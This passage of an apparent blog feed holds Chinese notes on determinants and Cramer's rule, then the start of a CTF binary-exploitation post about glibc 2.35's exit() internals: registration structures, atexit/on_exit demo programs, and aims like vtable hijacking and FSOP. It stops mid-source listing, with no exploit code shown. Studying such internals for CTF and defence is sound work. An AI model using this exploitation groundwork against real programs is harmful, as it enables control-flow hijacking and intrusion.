a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{bmatrix}$把行列互换得到的矩阵$\begin{bmatrix}a_{11}&amp;a_{21}&amp;…&amp;a_{n1}\a_{12}&amp;a_{22}&amp;…&amp;a_{n2}\…&amp;…&amp;…&amp;…\a_{1n}&amp;a_{2n}&amp;…&amp;a_{nn}\end{bmatrix}$称为A的转置，记作$A’$或$A^{T}$或$A^{t}$</p></blockquote><blockquote><p><strong>行列式的性质</strong>：</p><p><strong>性质1</strong>：转置的行列式与原先行列式值相等，即：$|A’|=|A|$</p><p><strong>性质2</strong>：行列式一行的公因子可以提出去，即（k=0也成立）：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>ka_{i1}&amp;ka_{i2}&amp;…&amp;ka_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=k\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质3</strong>：</p><p>行列式中若某一行是两组数的和，则此行列式等于两个行列式的和，这两个行列式的这一行分别是第一组数和第二组数，而其余各行与原来行列式的相应各行相同，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>b_1+c_1&amp;b_2+c_2&amp;…&amp;b_n+c_n\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>b_1&amp;b_2&amp;…&amp;b_{n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}+\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>c_1&amp;c_2&amp;…&amp;c_{n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质4</strong>：</p><p>两行互换，行列式反号，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>=-<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质5</strong>：</p><p>两行相同，行列式的值为0，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=0<br>$$</p><p><strong>性质6</strong>：</p><p>两行成比例，行列式的值为0，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>la_{i1}&amp;la_{i2}&amp;…&amp;la_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=0<br>$$</p><p><strong>性质7</strong>：</p><p>把一行的倍数加到另一行上，行列式的值不变，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}+la_{i1}&amp;a_{k2}+la_{i2}&amp;…&amp;a_{kn}+la_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p></blockquote><h1 id="行列式按行列展开">行列式按行(列)展开</h1><ul><li>行列式按行（列）展开的本质其实就是对行列式的展开做变形。</li></ul><blockquote><p>$|\mathbf{A}|=\begin{vmatrix}a_{11}&amp;a_{12}&amp;a_{13}\a_{21}&amp;a_{22}&amp;a_{23}\a_{31}&amp;a_{32}&amp;a_{33}\end{vmatrix}=(a_{11}a_{22}a_{33}-a_{11}a_{23}a_{32})+(a_{12}a_{23}a_{31}-a_{12}a_{21}a_{33})+(a_{13}a_{21}a_{32}-a_{13}a_{22}a_{31})$</p><p>$|\mathbf{A}|=a_{11}\begin{vmatrix}a_{22}&amp;a_{23}\a_{32}&amp;a_{33}\end{vmatrix}-a_{12}\begin{vmatrix}a_{21}&amp;a_{23}\a_{31}&amp;a_{33}\end{vmatrix}+a_{13}\begin{vmatrix}a_{21}&amp;a_{22}\a_{31}&amp;a_{32}\end{vmatrix}$</p><p><strong>定义1</strong>：</p><p>n级矩阵$\mathbf{A}$中，划去第i行和第j列，剩下的元素按照原来的次序组成<code>n-1</code>级矩阵的行列式称为矩阵$\mathbf{A}$的<code>(i,j)</code>元的<strong>余子式</strong>，记作$M_{ij}$。令$A_{ij}=(-1)^{i+j}M_{ij}$，则$A_{ij}$是$\mathbf{A}$的<code>(i,j)</code>元的代数余子式。</p></blockquote><ul><li>从行列式的按行展开推导出了如下几个定理：</li></ul><blockquote><p><strong>定理1</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$等于它的第i行元素与自己的代数余子式的乘积之和。$|\mathbf{A}|=a_{i1}A_{i1}+a_{i2}A_{i2}+…+a_{in}A_{in}=\sum_{j=1}^{n}a_{ij}A_{ij}$其中$i\in{1,2,…,n}$，该式子被陈伟n阶行列式的第i行的展开式</p><p><strong>定理2</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$等于它的第j列元素与自己的代数余子式的乘积之和，即：$|\mathbf{A}|=a_{1j}A_{1j}+a_{2j}A_{2j}+…+a_{nj}A_{nj}=\sum_{l=1}^{n}a_{lj}A_{lj}$</p><p><strong>定理3</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$的第i行元素与第k行($k≠i$)相应元素的代数余子式的乘积之和为0，即：$a_{i1}A_{k1}+a_{i2}A_{k2}+…+a_{in}A_{kn}=0$，当$k≠i$</p><p><strong>定理4</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$的第j列元素与第l列($l≠j$)相应元素的代数余子式的乘积之和为0，即：$a_{1j}A_{1l}+a_{2j}A_{2l}+…+a_{nj}A_{nl}=0$，当$l≠j$</p></blockquote><ul><li>特殊的行列式——范德蒙行列式</li></ul><blockquote></blockquote><h1 id="克拉默cramer法则">克拉默(Cramer)法则</h1><blockquote><p><strong>定理1</strong>：</p><p>数域$\mathbf{K}$上的n个方程的n元线性方程组有唯一解的充分必要条件是它的系数行列式（即系数矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$）不等于0。即<code>n级矩阵的初等行变换不改变它们的行列式的非零性质</code></p><p><strong>推论1</strong>：</p><p>数域$\mathbf{K}$上的n个方程的n元齐次线性方程组只有零解的充分必要条件是它的系数行列式不等于0，从而它有非零解的充分必要条件是它的系数行列式等于0。</p><p><strong>定理2</strong>：</p><p>记矩阵$\mathbf{B}<em>j,j=1,2,3…,n$即，$\mathbf{B_j=\begin{bmatrix}a</em>{11} &amp;…&amp;a_{1,j-1}&amp;b_1&amp;a_{1,j+1}&amp;…&amp;a_{1n}\ a_{21}&amp;…&amp;a_{2,j-1}&amp;b_2&amp;a_{2,j+1}&amp;…&amp;a_{2n}\ \vdots&amp;&amp;\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots\ a_{n1}&amp;…&amp;a_{n,j-1}&amp;b_n&amp;a_{2,j+1}&amp;…&amp;a_{nn}\end{bmatrix}}$。那么就有n个方程的n元线性方程组的系数</p><p>行列式$|\mathbf{A}|≠0$时，它的唯一解是：$(\frac{|B_1|}{|A|},\frac{|B_2|}{|A|},…,\frac{|B_n|}{|A|})$</p></blockquote><h1 id="行列式按k行列展开">行列式按k行(列)展开</h1><blockquote><p><strong>定义1</strong>：</p><p>n级矩阵$\mathbf{A}$中任意取定k行，k列$1\le k &lt; n$，位于这些行和列的交叉处的$k^2$个元素按原来的排法组成的<code>k</code>级矩阵的行列式称为$\mathbf{A}$的一个k阶子式。取定$\mathbf{A}$的第$i_1,i_2,…,i_k$行（$i_1&lt;i_2&lt;…&lt;i_k$），第$j_1,j_2,…,j_k$列（$j_1&lt;j_2&lt;…&lt;j_k$），所得到的k阶子式记作$\mathbf{A}\begin{bmatrix}i_1,i_2,…,i_k\ j_1,j_2,…,j_k\end{bmatrix}$。</p><p>划去这个k阶子式所在的行和列，剩下的元素原来的排法组成的<code>(n-k)</code>级矩阵的行列式称为<strong>余子式</strong>，它前面乘以$(-1)^{(i_1+i_2+…+i_k)+(j_1+j_2+…+j_k)}$则称为子式的<strong>代数余子式</strong>。</p><p>令${i’_1,i’<em>2,…,i’</em>{n-k}}={1,2,…,n}/{i_1,i_2,…,i_k}$，${j’<em>1,j’<em>2,…,j’</em>{n-k}}={1,2,3…,n}/{i_1,i_2,…,i_k}$，并且$i_1’&lt;i_2’&lt;…&lt;i’</em>{n-k},j’_1&lt;j’<em>2&lt;…&lt;j’</em>{n-k}$，则子式的余子式为$A\begin{bmatrix}i’_1,i’_2,…,i’_n\ j’_1,j’_2,…,j’_n\end{bmatrix}$</p><p><strong>定理1</strong>(Laplace定理，即拉普拉斯定理)：</p><p>在n级矩阵$|\mathbf{A}|$中，取定第$i_1,i_2,…,i_k$行（$i_1&lt;i_2&lt;…&lt;i_k$），则这k行元素形成的所有k阶子式与它们自己的代数余子式的乘积之和等于$|\mathbf{A}|$，即$|\mathbf{A}|=\sum_{1\le j_1&lt;j_2&lt;…&lt;j_k\le n}\mathbf{A}\begin{bmatrix}i_1,i_2,…,i_k\ j_1,j_2,…,j_k\end{bmatrix}(-1)^{(i_1+…+i_k)+(j_1+…+j_k)}A\begin{bmatrix}i’_1,i’_2,…,i’_n\ j’_1,j’_2,…,j’_n\end{bmatrix}$</p></blockquote>]]></content>
    
    
    <summary type="html">前言：继续</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN-trick-exit函数利用</title>
    <link href="http://iyheart.github.io/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"/>
    <id>http://iyheart.github.io/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/</id>
    <published>2025-09-07T06:05:08.000Z</published>
    <updated>2025-09-10T23:54:39.809Z</updated>
    
    <content type="html"><![CDATA[<ul><li>碎碎念：之前看到打exit的题目都有点不太像去看，这周尝试去看了一题打exit的，虽然没打出来但是在牢题目的时候大致了解了<code>exit</code>的大致流程，也知道了哪些地方可以进行利用。并且还了解了<code>exit</code>函数，在系统调用<code>exit</code>之前会进行一个<code>IO_FILE</code>的刷新流。所以类似于<code>house of apple</code>这种堆利用基本上也快可以理解了。</li><li>在打exit的时候也尝试去劫持<code>vtable</code>，虽然也没利用成功，但是也理解了<code>FSOP</code>的相关利用方式，感觉堆的<code>30</code>种类型应该这个学期就能结束了。（结束了就开内核了，有点单线程，在堆没结束前不太想碰其他的pwn题。）</li><li>参考博客：<a href="https://www.anquanke.com/post/id/243196">exit（）分析与利用-安全KER - 安全资讯平台</a></li></ul><h1 id="exit函数执行流程结束时">exit函数执行流程(结束时)</h1><ul><li><p><code>exit()</code>函数的源码位于<code>glibc-2.35\stdlib\exit.c</code>，在<code>exit()</code>函数调用的还会用到<code>exit.h</code>、</p></li><li><p>由于低版本的堆由于<code>hook</code>函数，利用还是比较容易的，所以这个<code>exit()</code>函数，就使用<code>glibc2.35</code>版本的源码进行调试（刚好本地Ubuntu的libc版本其实也是<code>glibc2.35</code>），本地就有现成环境。</p></li><li><p>首先总体介绍一下<code>exit()</code>函数的调用流程，注意<code>glibc中的exit()</code>和<code>exit系统调用</code>需要区分开来：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>()-&gt;</span><br><span class="line">__run_exit_handlers()-&gt;</span><br><span class="line">    __call_tls_dtors()</span><br><span class="line">    __libc_atexit()</span><br><span class="line">_exit() <span class="comment">// 执行exit系统调用</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250909180658225.png" alt="image-20250909180658225"></p><h2 id="exit函数两个重要结构体">exit函数两个重要结构体</h2><ul><li>在介绍<code>exit</code>函数执行流程之前，需要介绍两个结构体，以便于理解<code>exit()</code>函数的执行过程。</li><li>结构体1：<code>exit_function</code>结构体，这里其实是一个注册函数的结构体。</li><li>程序在启动的时候会注册许多函数，这些函数在程序运行结束的时候调用<code>exit()</code>的时候就会被<code>exit()</code>函数一个一个的执行过去，主要目的是在退出程序的时候可以自动执行一些清理操作，从而达到自动释放资源的目的。</li><li><code>exit_function</code>结构体主要就两个东西：<ul><li><code>flavor</code>变量：用于表示是否有注册函数，<code>flavor=0</code>时表示没有注册函数，<code>flavor=1</code>的时候表示存在注册函数，该函数没有参数传递进去。<code>flavor=2</code>的时候表示存在注册函数，该函数调用时带有参数。<code>flavor=3</code>的时候表示存在注册函数，该函数是<code>C++</code>的析构函数。</li><li><code>析构函数</code>：C++在使用类模版创建了一个实例对象之后，程序结束后需要调用该析构函数释放这个实例对象。</li><li><code>func</code>这个联合体：存储着函数指针，需要传递的参数，以及析构函数的<code>void *dso_handle;</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>结构体2：<code>exit_function_list</code>，用于管理注册函数的链表，是单向链表，其结构体如图所示。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250909183535553.png" alt="image-20250909183535553"></p><ul><li>程序在执行main函数之前调用了<code>glibc</code>中的某些函数来注册函数，而<code>glibc</code>也向用户提供了<code>atexit()、on_exit()、__cxa_atexit()</code>这三个注册函数，使得我们在<code>Linux</code>编写<code>C</code>程序的时候也能注册属于自己的一些函数。注意：注册的函数按照栈结构进行调用，也就是<strong>后面注册的函数，会先被执行</strong><ul><li><code>atexit()</code>函数注册的是无参函数</li><li><code>on_exit()</code>函数注册的是带参数的函数</li><li><code>__cxa_atexit()</code>函数注册的是析构函数</li></ul></li><li>先注册一个无参函数并调试看看</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册一个无参函数,该函数会在程序执行结束后执行</span></span><br><span class="line"><span class="comment">// int atexit(void (*func)(void))</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my_atexit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (atexit(my_atexit1) !=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910192635113.png" alt="image-20250910192635113"></p><p>在调用<code>atexit</code>之前进行查看<code>initial</code>这个结构体，该结构体就是libc中存储注册函数的结构体，也就是这个结构体<code>exit_function_list</code></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910192940226.png" alt="image-20250910192940226"></p><p>调用<code>atexit</code>后，该结构体的<code>fns</code>就会多出来一个结构体，并且<code>idx</code>也会变成<code>2</code>，还会发现<code>at</code>这个函数指针并不是真实的函数地址是被加密过的函数地址。</p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910193208482.png" alt="image-20250910193208482"></p><ul><li>接下来再注册一个带参数的函数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int on_exit(void (* function) (int void*), void *arg);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit2</span><span class="params">(<span class="type">int</span> status,<span class="type">void</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye~ %s\n&quot;</span>,(<span class="type">char</span>*)s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *msg = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (on_exit(my_atexit2,msg) !=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194011806.png" alt="image-20250910194011806"></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194054142.png" alt="image-20250910194054142"></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194112657.png" alt="image-20250910194112657"></p><ul><li>第三个就不举例了，接下来还需要看看，如果函数注册满了<code>32</code>个之后，还有函数需要注册那么这些函数会放在哪里呢？下面这个程序探究一下这个。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my_atexit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (atexit(my_atexit1) !=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调试情况如下，当超过<code>32</code>个的时候，再进行函数的注册就会申请堆块用做后续的注册。</li></ul><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910195402776.png" alt="image-20250910195402776"></p><ul><li>而这个堆块的<code>next</code>指针，指向的是<code>initial</code>这个结构体，也就是位于<code>glibc</code>中的<code>exit_function_list</code>。所以从某种程度上说明了后注册的函数先被调用。当只有<code>initial</code>这个结构体存在，还是后被注册的函数先被执行。</li></ul><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910195639862.png" alt="image-20250910195639862"></p><h2 id="exit函数源码">exit函数源码</h2><ul><li>源码如下：首先是一个简单的封装<code>exit()</code>函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><ul><li>接下来就是<code>__run_exit_handlers()</code>函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 